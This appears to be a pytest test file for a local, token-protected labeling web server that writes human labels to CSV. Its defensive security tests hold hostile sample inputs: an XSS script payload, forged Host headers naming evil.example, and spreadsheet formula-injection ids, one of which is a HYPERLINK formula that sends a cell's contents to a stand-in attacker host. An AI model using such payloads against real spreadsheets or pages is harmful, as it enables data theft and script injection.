"""`judgekeeper label`: a local labeling page on 127.0.0.1, writing the template's CSV shape."""

import csv
import http.client
import json
import os
import queue
import signal
import subprocess
import sys
import threading
import urllib.request
from pathlib import Path

import pytest

from judgekeeper import label as label_mod
from judgekeeper.anchors import load_verified
from judgekeeper.cli import main
from judgekeeper.label import LabelError, LabelServer, LabelSession


def _items(tmp_path, n=4, pairwise=False, extra=None):
    path = tmp_path / "items.jsonl"
    rows = []
    for i in range(n):
        if pairwise:
            row = {"id": f"p{i}", "input": f"q{i}", "output_a": f"a{i}", "output_b": f"b{i}"}
        else:
            row = {"id": f"it{i}", "input": f"question {i}", "output": f"answer {i}"}
        rows.append({**row, **(extra or {})})
    path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
    return path


def _read(path):
    with Path(path).open(newline="", encoding="utf-8") as f:
        return list(csv.DictReader(f))


class Client:
    def __init__(self, server):
        self.server = server

    def request(self, method, path, body=None, token=True, host=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.server.port, timeout=5)
        if token:
            path += ("&" if "?" in path else "?") + f"token={self.server.token}"
        headers = {"Host": host or f"127.0.0.1:{self.server.port}"}
        data = None
        if body is not None:
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=data, headers=headers)
        resp = conn.getresponse()
        payload = resp.read()
        conn.close()
        return resp, payload

    def state(self):
        resp, payload = self.request("GET", "/state")
        assert resp.status == 200
        return json.loads(payload)

    def label(self, **body):
        resp, payload = self.request("POST", "/label", body)
        return resp.status, json.loads(payload)


@pytest.fixture
def serve():
    started = []

    def start(items, out, **kw):
        server = LabelServer(LabelSession(items, out), port=0)
        thread = threading.Thread(target=server.serve, kwargs=kw, daemon=True)
        thread.start()
        started.append((server, thread))
        return Client(server)

    yield start
    for server, thread in started:
        server.stop()
        thread.join(timeout=5)


def test_binds_loopback_only(tmp_path, serve):
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    assert client.server.host == "127.0.0.1"
    assert client.server.url.startswith(f"http://127.0.0.1:{client.server.port}/?token=")
    assert len(client.server.token) >= 32


def test_page_is_self_contained(tmp_path, serve):
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    resp, payload = client.request("GET", "/")
    assert resp.status == 200
    page = payload.decode()
    assert page.startswith("<!doctype html>")
    for external in ('src="http', "src='http", 'href="http', "//cdn", "@import", "fetch('http",
                     'fetch("http'):
        assert external not in page
    csp = resp.getheader("Content-Security-Policy")
    assert "default-src 'none'" in csp and "connect-src 'self'" in csp
    assert "show judge" in page.lower()


def test_every_request_needs_the_token(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    for method, path, body in (("GET", "/", None), ("GET", "/state", None),
                               ("POST", "/label", {"id": "it0", "label": "pass"})):
        resp, _ = client.request(method, path, body, token=False)
        assert resp.status == 403
        resp, _ = client.request(method, path + "?token=wrong", body, token=False)
        assert resp.status == 403
    assert not out.exists()
    status, _ = client.label(id="it0", label="pass")
    assert status == 200
    assert _read(out)[0]["human_label"] == "pass"


@pytest.mark.parametrize("host", ["evil.example", "evil.example:{port}", "localhost:{port}",
                                  "127.0.0.1:1", "0.0.0.0:{port}"])
def test_host_header_must_be_the_bound_address(tmp_path, serve, host):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    host = host.format(port=client.server.port)
    resp, _ = client.request("GET", "/", host=host)
    assert resp.status == 403
    resp, _ = client.request("POST", "/label", {"id": "it0", "label": "pass"}, host=host)
    assert resp.status == 403
    assert not out.exists()


def test_labels_are_written_immediately_in_the_template_shape(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    client.label(id="it0", label="pass")
    status, state = client.label(id="it1", label="fail", note="wrong unit")
    assert status == 200
    rows = _read(out)
    assert list(rows[0]) == ["id", "input", "output", "human_label", "notes"]
    assert [r["id"] for r in rows] == ["it0", "it1", "it2", "it3"]
    assert [r["human_label"] for r in rows] == ["pass", "fail", "", ""]
    assert rows[1]["notes"] == "wrong unit" and rows[1]["output"] == "answer 1"
    s = state["summary"]
    assert s["n_items"] == 4 and s["n_labeled"] == 2 and s["n_deferred"] == 0
    assert s["progress"] == "2 of 4 labeled, 0 deferred"


def test_undo_clears_a_label(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    client.label(id="it0", label="pass")
    status, state = client.label(id="it0", label=None)
    assert status == 200 and state["summary"]["n_labeled"] == 0
    assert _read(out)[0]["human_label"] == ""


def test_writes_are_atomic(tmp_path, serve, monkeypatch):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    client.label(id="it0", label="pass")
    before = out.read_bytes()
    calls = []
    real_replace = os.replace

    def replace(src, dst):
        calls.append((Path(src), Path(dst)))
        raise OSError("disk full")

    monkeypatch.setattr(label_mod.os, "replace", replace)
    status, body = client.label(id="it1", label="fail")
    assert status == 500 and "disk full" in body["error"]
    assert out.read_bytes() == before  # the old file is intact
    src, dst = calls[0]
    assert dst == out and src.parent == out.parent and src != out
    assert sorted(p.name for p in tmp_path.iterdir()) == ["items.jsonl", "labels.csv"]

    monkeypatch.setattr(label_mod.os, "replace", real_replace)
    status, _ = client.label(id="it1", label="fail")
    assert status == 200
    assert [r["human_label"] for r in _read(out)][:2] == ["pass", "fail"]


def test_reopening_resumes(tmp_path, serve):
    items, out = _items(tmp_path), tmp_path / "labels.csv"
    client = serve(items, out)
    client.label(id="it0", label="pass", note="ok")
    client.label(id="it1", label="fail")
    client.server.stop()

    session = LabelSession(items, out)
    state = session.state()
    assert [i["label"] for i in state["items"]] == ["pass", "fail", None, None]
    assert state["items"][0]["note"] == "ok"
    assert state["start"] == 2  # the first item still to label
    assert state["summary"]["progress"] == "2 of 4 labeled, 0 deferred"


def test_resume_reads_spreadsheet_spellings(tmp_path):
    items, out = _items(tmp_path, n=2), tmp_path / "labels.csv"
    main(["template", str(items), "-o", str(out)])
    rows = _read(out)
    rows[0]["human_label"] = "Yes"
    with out.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)
    state = LabelSession(items, out).state()
    assert [i["label"] for i in state["items"]] == ["pass", None]


def test_out_with_unknown_ids_is_refused(tmp_path):
    out = tmp_path / "labels.csv"
    out.write_text("id,input,output,human_label,notes\nzzz,q,o,pass,\n")
    with pytest.raises(LabelError, match="zzz"):
        LabelSession(_items(tmp_path), out)


def test_deferred_items_stay_unlabeled(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    status, state = client.label(id="it2", deferred=True)
    assert status == 200
    assert state["summary"]["progress"] == "0 of 4 labeled, 1 deferred"
    assert all(r["human_label"] == "" for r in _read(out))
    status, state = client.label(id="it2", label="fail")  # labeling clears the deferral
    assert state["summary"]["n_deferred"] == 0 and state["summary"]["n_labeled"] == 1


def test_bad_requests(tmp_path, serve):
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    assert client.label(id="it0", label="A")[0] == 400  # pairwise label on a single item
    assert client.label(id="nope", label="pass")[0] == 404
    resp, _ = client.request("POST", "/label", None)
    assert resp.status == 400
    resp, _ = client.request("GET", "/nothing")
    assert resp.status == 404


def test_done_summary(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    for i, lab in enumerate(["pass", "pass", "pass"]):
        client.label(id=f"it{i}", label=lab)
    _, state = client.label(id="it3", deferred=True)
    s = state["summary"]
    assert s["done"] is True
    assert s["distribution"] == {"pass": 3}
    messages = " ".join(s["warnings"])
    assert "Only 3 labeled items" in messages and "more lopsided than 80/20" in messages
    assert s["next_command"] == f"judgekeeper import-labels {out} -o anchors.jsonl"


def test_output_reads_with_import_labels(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path), out)
    for i, lab in enumerate(["pass", "fail", "pass"]):
        client.label(id=f"it{i}", label=lab)
    client.label(id="it3", deferred=True)
    anchors = tmp_path / "anchors.jsonl"
    assert main(["import-labels", str(out), "-o", str(anchors)]) == 0
    items, manifest = load_verified(anchors)
    assert [i["id"] for i in items] == ["it0", "it1", "it2"]
    assert manifest["label_distribution"] == {"fail": 1, "pass": 2}


def test_pairwise_records_a_and_b(tmp_path, serve):
    out = tmp_path / "labels.csv"
    client = serve(_items(tmp_path, n=2, pairwise=True), out)
    state = client.state()
    assert state["kind"] == "pairwise" and state["labels"] == ["A", "B"]
    assert state["items"][0]["output_a"] == "a0" and state["items"][0]["output_b"] == "b0"
    assert client.label(id="p0", label="pass")[0] == 400
    client.label(id="p0", label="A")
    client.label(id="p1", label="B")
    rows = _read(out)
    assert list(rows[0]) == ["id", "input", "output_a", "output_b", "human_label", "notes"]
    assert [r["human_label"] for r in rows] == ["A", "B"]
    anchors = tmp_path / "anchors.jsonl"
    assert main(["import-labels", str(out), "-o", str(anchors)]) == 0
    assert [i["human_label"] for i in load_verified(anchors)[0]] == ["A", "B"]


def test_judge_verdict_is_carried_but_hidden_by_default(tmp_path, serve):
    items = _items(tmp_path, extra={"verdict": "pass", "reason": "looks right"})
    client = serve(items, tmp_path / "labels.csv")
    item = client.state()["items"][0]
    assert item["judge"] == {"verdict": "pass", "reason": "looks right"}
    _, payload = client.request("GET", "/")
    assert 'id="judge" hidden' in payload.decode()


def test_strings_are_escaped(tmp_path, serve):
    path = tmp_path / "items.jsonl"
    evil = "<script>alert(1)</script>"
    path.write_text(json.dumps({"id": "x", "input": evil, "output": f"</script>{evil}"}) + "\n",
                    encoding="utf-8")
    client = serve(path, tmp_path / "labels.csv")
    resp, payload = client.request("GET", "/")
    page = payload.decode()
    assert "alert(1)" in page  # the item is in the page...
    assert "<script>alert" not in page and "</script><script>" not in page  # ...but inert
    assert ".innerHTML" not in page  # every displayed string goes through textContent
    resp, payload = client.request("GET", "/state")
    assert resp.getheader("Content-Type").startswith("application/json")
    assert resp.getheader("X-Content-Type-Options") == "nosniff"
    assert json.loads(payload)["items"][0]["input"] == evil


def test_server_exits_when_idle(tmp_path):
    server = LabelServer(LabelSession(_items(tmp_path), tmp_path / "labels.csv"), port=0)
    thread = threading.Thread(target=server.serve, kwargs={"idle_timeout": 0.3}, daemon=True)
    thread.start()
    thread.join(timeout=5)
    assert not thread.is_alive()


def test_cli_label(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(label_mod, "IDLE_TIMEOUT", 0.3)
    opened = []
    monkeypatch.setattr(label_mod.webbrowser, "open", lambda url: opened.append(url))
    out = tmp_path / "labels.csv"
    assert main(["label", str(_items(tmp_path)), "--out", str(out), "--port", "0",
                 "--no-browser"]) == 0
    printed = capsys.readouterr().out
    assert "http://127.0.0.1:" in printed and "token=" in printed
    assert opened == []
    assert main(["label", str(_items(tmp_path)), "--out", str(out), "--port", "0"]) == 0
    assert len(opened) == 1 and opened[0].startswith("http://127.0.0.1:")


def test_cli_label_prints_its_link_at_once_when_stdout_is_a_pipe(tmp_path):
    """Started in the background or piped to a log, stdout is not a terminal. The link carries
    the token, so it must be readable while the command is still running."""
    out = tmp_path / "labels.csv"
    env = {k: v for k, v in os.environ.items() if k != "PYTHONUNBUFFERED"}
    proc = subprocess.Popen(
        [sys.executable, "-m", "judgekeeper.cli", "label", str(_items(tmp_path)), "--out",
         str(out), "--port", "0", "--no-browser"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env)
    lines: queue.Queue = queue.Queue()
    reader = threading.Thread(target=lambda: [lines.put(x) for x in proc.stdout], daemon=True)
    reader.start()
    try:
        started = []
        try:
            while len(started) < 3:  # the three start-up lines
                started.append(lines.get(timeout=15).rstrip("\n"))
        except queue.Empty:
            pytest.fail(f"start-up lines not written while running; got {started}")
        assert proc.poll() is None, "the command is still running"
        assert started[0].startswith("labeling 4 single items into ")
        (link,) = [x.removeprefix("open ") for x in started if x.startswith("open ")]
        assert link.startswith("http://127.0.0.1:") and "/?token=" in link
        assert "Ctrl-C" in started[2]
        with urllib.request.urlopen(link, timeout=5) as resp:  # the printed link opens the page
            assert resp.status == 200 and b"judgekeeper label" in resp.read()
    finally:
        if sys.platform == "win32":  # Windows cannot send SIGINT to a child: stop it outright
            proc.terminate()
        else:
            proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:  # SIGINT is ignored when pytest itself runs detached
            proc.kill()
            proc.wait(timeout=5)
        reader.join(timeout=5)


def _run_and_stop(tmp_path, monkeypatch, out, during=None):
    """Run the command in this process until it is idle; the lines it printed."""
    monkeypatch.setattr(label_mod, "IDLE_TIMEOUT", 0.3)
    printed = []
    if during is not None:
        original = label_mod.LabelServer.serve

        def serve(self, idle_timeout=None):
            thread = threading.Thread(target=original, args=(self, idle_timeout), daemon=True)
            thread.start()
            during(Client(self))
            thread.join(timeout=5)

        monkeypatch.setattr(label_mod.LabelServer, "serve", serve)
    label_mod.run(_items(tmp_path), out, port=0, open_browser=False, print_fn=printed.append)
    return printed


def test_stopping_with_nothing_labeled_does_not_point_at_a_file(tmp_path, monkeypatch):
    out = tmp_path / "labels.csv"
    printed = _run_and_stop(tmp_path, monkeypatch, out)
    assert not out.exists()
    assert printed[-1] == "stopped: nothing was labeled, so no file was written"
    assert "labels in" not in "\n".join(printed) and "next:" not in "\n".join(printed)


def test_stopping_with_labels_names_the_file_and_the_next_command(tmp_path, monkeypatch):
    out = tmp_path / "labels.csv"
    printed = _run_and_stop(tmp_path, monkeypatch, out,
                            during=lambda client: client.label(id="it0", label="pass"))
    assert out.is_file()
    assert printed[-2] == f"stopped: 1 of 4 labeled, 0 deferred; labels in {out}"
    assert printed[-1].startswith("next: judgekeeper import-labels ")


def test_cli_label_bad_items_is_usage_error(tmp_path, capsys):
    path = tmp_path / "items.jsonl"
    path.write_text(json.dumps({"id": "x", "input": "q"}) + "\n", encoding="utf-8")
    assert main(["label", str(path), "--no-browser", "--port", "0"]) == 2
    assert "output" in capsys.readouterr().err


# --- spreadsheet formula injection (security audit item 5) -------------------------------------


def test_written_sheet_neutralises_formula_prefixes(tmp_path, serve):
    items = tmp_path / "items.jsonl"
    items.write_text(json.dumps({"id": "it0", "input": "=1+1", "output": "@cmd"}) + "\n",
                     encoding="utf-8")
    out = tmp_path / "labels.csv"
    client = serve(items, out)
    client.label(id="it0", label="pass", note="-not a formula")
    row = _read(out)[0]
    assert (row["input"], row["output"], row["notes"]) == ("'=1+1", "'@cmd", "'-not a formula")
    client.server.stop()
    first = LabelSession(items, out).state()["items"][0]
    # The quote is only in the file; what the browser shows is the original text.
    assert (first["input"], first["output"], first["note"]) == ("=1+1", "@cmd", "-not a formula")


def test_formula_ids_are_guarded_and_survive_resume_and_import(tmp_path, serve):
    """Security review, finding 1: the id column is a cell like any other."""
    ids = ('=HYPERLINK("http://evil.example/?x="&A1,"click")', "+1+1", "-2", "@SUM(1)",
           "\ttab", "\rcr")
    items = tmp_path / "items.jsonl"
    items.write_text("".join(json.dumps({"id": i, "input": f"q{n}", "output": f"a{n}"}) + "\n"
                             for n, i in enumerate(ids)), encoding="utf-8")
    known = [i.strip() for i in ids]  # ids are trimmed when read, here as everywhere
    out = tmp_path / "labels.csv"
    client = serve(items, out)
    for item_id in known:
        status, _ = client.label(id=item_id, label="pass")
        assert status == 200
    with out.open(newline="", encoding="utf-8") as f:
        cells = [cell for row in list(csv.reader(f))[1:] for cell in row]
    assert not [c for c in cells if c.startswith(("=", "+", "-", "@", "\t", "\r"))]
    client.server.stop()
    resumed = LabelSession(items, out)  # the guarded ids are recognised, not "unknown ids"
    assert [(i["id"], i["label"]) for i in resumed.items] == [(i, "pass") for i in known]
    resumed.update({"id": known[0], "label": "fail"})
    anchors = tmp_path / "anchors.jsonl"
    assert main(["import-labels", str(out), "-o", str(anchors)]) == 0
    loaded, _ = load_verified(anchors)
    assert [i["id"] for i in loaded] == known
    assert known[:4] == list(ids[:4])
    assert loaded[0]["human_label"] == "fail"


def test_idle_connection_does_not_freeze_the_server(tmp_path, serve, monkeypatch):
    """Security review, finding 3: a connection that sends nothing must not block the rest."""
    import socket
    import time

    monkeypatch.setattr(label_mod, "CONNECTION_TIMEOUT", 1.0)
    client = serve(_items(tmp_path), tmp_path / "labels.csv")
    idle = socket.create_connection(("127.0.0.1", client.server.port))
    try:
        time.sleep(0.3)  # the server has accepted the silent connection and is waiting on it
        start = time.monotonic()
        assert client.state()["summary"]["n_items"] == 4
        assert time.monotonic() - start < 4
    finally:
        idle.close()


# Stopping by itself once the result is served (the page `judgekeeper start` passes)

def _serve_until_done(tmp_path, **kw):
    server = LabelServer(LabelSession(_items(tmp_path, n=3), tmp_path / "labels.csv"), port=0,
                         **kw)
    thread = threading.Thread(target=server.serve, daemon=True)
    thread.start()
    return server, thread, Client(server)


def _result(session, back):
    assert back.startswith("/?token=")
    return f"<!doctype html><p>{session.summary()['n_labeled']} labeled</p>"


def test_with_a_result_it_stops_after_serving_it(tmp_path):
    _, thread, client = _serve_until_done(tmp_path, result=_result)
    assert client.label(id="it0", label="pass")[0] == 200
    assert client.label(id="it1", deferred=True)[0] == 200
    assert thread.is_alive(), "two of three: still serving"
    status, body = client.label(id="it2", label="fail")
    assert status == 200 and body["summary"]["done"]
    thread.join(timeout=0.5)
    assert thread.is_alive(), "done, but the page has not fetched the result yet"
    resp, payload = client.request("GET", "/result")
    assert resp.status == 200 and payload.decode() == "<!doctype html><p>2 labeled</p>"
    assert resp.getheader("Content-Type") == "text/html; charset=utf-8"
    thread.join(timeout=5)
    assert not thread.is_alive()
    assert [r["human_label"] for r in _read(tmp_path / "labels.csv")] == ["pass", "", "fail"]


def test_a_result_before_the_end_keeps_serving(tmp_path):
    server, thread, client = _serve_until_done(tmp_path, result=_result)
    client.label(id="it0", label="pass")
    resp, payload = client.request("GET", "/result")
    assert resp.status == 200 and b"1 labeled" in payload
    assert "script-src" not in resp.getheader("Content-Security-Policy")
    thread.join(timeout=0.5)
    assert thread.is_alive()
    server.stop()
    thread.join(timeout=5)


def test_with_a_result_it_stops_anyway_when_nobody_fetches_it(tmp_path, monkeypatch):
    monkeypatch.setattr(label_mod, "RESULT_WAIT", 0.3)
    _, thread, client = _serve_until_done(tmp_path, result=_result)
    for n in range(3):
        client.label(id=f"it{n}", label="pass")
    thread.join(timeout=5)
    assert not thread.is_alive()


def test_plain_label_keeps_serving_when_done(tmp_path):
    server, thread, client = _serve_until_done(tmp_path)
    for n in range(3):
        assert client.label(id=f"it{n}", label="pass")[0] == 200
    thread.join(timeout=0.5)
    assert thread.is_alive()
    server.stop()
    thread.join(timeout=5)


def test_plain_label_keeps_its_own_page_and_has_no_result(tmp_path):
    server, thread, client = _serve_until_done(tmp_path)
    try:
        page = server.page()[0]
        assert "Defer" in page and "Show judge" in page and "See my result" not in page
        assert client.request("GET", "/result")[0].status == 404
    finally:
        server.stop()
        thread.join(timeout=5)
